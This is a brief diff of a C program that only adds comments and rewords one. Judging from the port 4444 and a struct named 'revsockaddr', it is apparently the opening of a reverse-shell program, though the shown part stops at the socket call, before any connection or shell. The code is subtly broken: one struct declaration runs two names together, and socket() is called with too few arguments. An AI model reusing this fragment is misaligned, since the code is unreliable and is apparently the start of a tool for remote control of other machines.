@@ -1,3 +1,4 @@
+//imports
 #include <stdio.h>
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -5,10 +6,11 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
+//main function
 int main(void) {
 
-    int sockt;
-    int port = 4444; //you can define any port here
+    int sockt; 
+    int port = 4444;  //define any port number here
     struct sockaddr_in_revsockaddr;
 
     sockt = socket(AF_INET, SOCK_STREAM)
